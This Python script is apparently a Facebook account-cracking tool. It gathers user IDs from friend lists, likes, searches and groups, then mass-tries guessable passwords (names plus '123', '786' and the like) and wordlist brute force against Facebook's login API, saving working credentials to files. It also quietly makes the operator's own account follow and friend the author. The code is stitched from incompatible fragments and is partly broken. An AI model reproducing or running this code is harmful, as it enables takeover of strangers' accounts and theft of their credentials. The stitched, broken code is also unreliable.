#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# coded by suneo project 
# reedit & translate to indonesia by junaidi
import os
import re 
import time
import json
import random
import requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
mbasic = 'https://mbasic.facebook.com{}'
global die,check,result, count
id = []
die = 0
chek = []
life = []
count = 0
check = 0
result = 0
def masuk():
        print('\n\n\t\t≺ \033[1;36mFACEBOOK LOGIN\033[0m ≻\n\n')
        try:
                cek = open("cookies").read()
        except FileNotFoundError:
                cek = input("[\033[1;32m>\033[0m Masukan Cookie : ")
        cek = {"cookie":cek}
        ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
        if "mbasic_logout_button" in str(ismi):
                if "Apa yang Anda pikirkan sekarang" in str(ismi):
                        with open("cookies","w") as f:
                                f.write(cek["cookie"])
                else:
                        print("# Ganti Bahasa, Mohon Tunggu!!")
                        try:
                                requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                        except:
                                pass
                try:
                        # please don't remove this or change
                        ikuti = parser(requests.get(mbasic.format("/suneo.suneo.3"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                        ses.get(mbasic.format(ikuti),cookies=cek)
                except :
                        pass 
                return cek["cookie"]
        else:
                 exit("# cookie Tidak valid")
def login(username,password,cek=False):
        global die,check,result,count
        b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
        params = {
                'access_token': b,
                'format': 'JSON',
                'sdk_version': '2',
                'email': username,
                'locale': 'en_US',
                'password': password,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
        }
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if 'EAA' in response.text:
                print(f"\r[\033[1;32mLIFE\033[0m] {username} => {password}                       ",end="")
                print()
                result += 1
                if cek:
                        life.append(username+"|"+password)
                else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + password + '\n')
        elif 'www.facebook.com' in response.json()['error_msg']:
                print(f"\r[\033[1;91mCHEK\033[0m] {username} => {password}                    ",end="")
                print()
                check += 1
                if cek:
                        chek.append(username+"|"+password)
                else:
                        with open('results-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
        else:
                die += 1
        for i in list('\|/-•'):
                        print(f"\r[{i}] Life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
                        time.sleep(0.2)
def getid(url):
        raw = requests.get(url,cookies=kuki).content
        getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
        for x in getuser:
                if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                elif 'friends' in x:
                        continue
                else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                print('\r# ' + str(len(id)) + " retrieved",end="")
        if 'Lihat Teman Lain' in str(raw):
                getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
        return id
def fromlikes(url):
        try:
                like = requests.get(url,cookies=kuki).content
                love = re.findall('href="(/ufi.*?)"',str(like))[0]
                aws = getlike(mbasic.format(love))
                return aws
        except:
                exit("# cant dump id ")
def getlike(react):
        like = requests.get(react,cookies=kuki).content
        ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
        for user in ids:
                if 'profile' in user[0]:
                        id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0].split('/')[1])
                print(f'\r# {str(len(id))} retrieved',end="")
        if 'Lihat Selengkapnya' in str(like):
                getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
        return id
def bysearch(option):
        search = requests.get(option,cookies=kuki).content
        users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
        for user in users:
                if "profile" in user[0]:
                        id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0].split("?")[0])
                print(f"\r# {str(len(id))} retrieved ",end="")
        if "Lihat Hasil Selanjutnya" in str(search):
                bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
        return id
def grubid(endpoint):
        grab = requests.get(endpoint,cookies=kuki).content
        users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
        for user in users:
                if "profile" in user[0]:
                        id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0])
                print(f"\r# {str(len(id))} retrieved ",end="")
        if "Lihat Selengkapnya" in str(grab):
                grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
        return id
if __name__ == '__main__':
        try:
                os.system("git pull")
                ses = requests.Session()
                kukis = masuk()
                kuki = {'cookie':kukis}

		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦                     
\033[1;96m             	    Suneo Updated 0.5                
\033[1;96m							lu jancok...
\033[1;96m. 		 DOSA TANGGUNG SENDIRI AMNJINX:V
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;97m        ___    ___   _   _ _____ _     
\033[1;92m          			Updated✔ 
\033[1;97m     ____   ______ ______     __   ___
\033[1;92m      
\033[1;97m      
\033[1;97m      
                                                               

"""


jalan("   \033[1;93m Welcome to Suneo Project  ")

jalan("\033[1;97m•◈•──────────•◈•\033[1;96mSuneo•projeck\033[1;96m•◈•──────────•◈•")

CorrectUsername = "suneo"
CorrectPassword = "suneo"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;97mUSER ID \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;97mPASWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 50*"\033[1;96m▪"
		
		
		print('          \033[1;97m[◉] \x1b[1;96mLogin New Fresh Account \033[1;97m[◉]' )
		id = raw_input('          \033[1;97m[◉] \033[1;97mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('          \033[1;97m[◉] \033[1;97mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful...'
				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;97m[!] There is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[!] Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;97mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
	print "\033[1;32;40m[2] \033[1;33;40m══Update suneo"																														
	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\033[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;97mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\033[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;97m[✺] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[✺] Name : "+op["name"]
		except KeyError:
			print"\033[1;97m[✺] ID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\033[1;97m[+] \033[1;97mEnter the file name \033[1;97m: \033[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;97mFill in correctly"
		pilih_super()

	
	print "\033[1;36;40m[✺] Total IDs : \033[1;97m"+str(len(id))
	jalan('\033[1;34;40m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Cloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"

	jalan('                    \033[1;97msuneo start cloning Wait...')
	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass1 + ' 👽 ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass2 + ' 👽 ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass3 + ' 👽 ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass4 + ' 👽 ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;97m....'
	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	print """
\033[1;31;40m ●════════════════════════◄►════════════════════════●
           """
	raw_input("\n\033[1;97m[\033[1;97mExit\033[1;97m]")
	super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;97m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
        try:
            email = raw_input('\033[1;97m[+] \033[1;97mID\033[1;97m/\033[1;97mEmail \033[1;97mTarget \033[1;97m:\033[1;97m ')
            passw = raw_input('\033[1;97m[+] \033[1;97mWordlist \033[1;97mext(list.txt) \033[1;97m: \033[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\033[1;97m[\033[1;97m\xe2\x9c\x93\033[1;97m] \033[1;97mTarget \033[1;97m:\033[1;97m ' + email
            print '\033[1;97m[+] \033[1;97mTotal\033[1;97m ' + str(len(total)) + ' \033[1;97mPassword'
            jalan('\033[1;97m[\xe2\x9c\xba] \033[1;97mPlease wait \033[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[1;97m[\033[1;97m\xe2\x9c\xb8\033[1;97m] \033[1;97mTry \033[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\033[1;97m[+] \033[1;97mFounded.'
                        print 52 * '\033[1;97m\xe2\x95\x90'
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\033[1;97m[+] \033[1;97mFounded.'
                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                            print '\033[1;97m[!] \033[1;97mAccount Maybe Checkpoint'
                            print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                            print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\033[1;97m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\033[1;97m[!] File not found...'
            print """\n\033[1;97m[!] \033[1;97mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login()
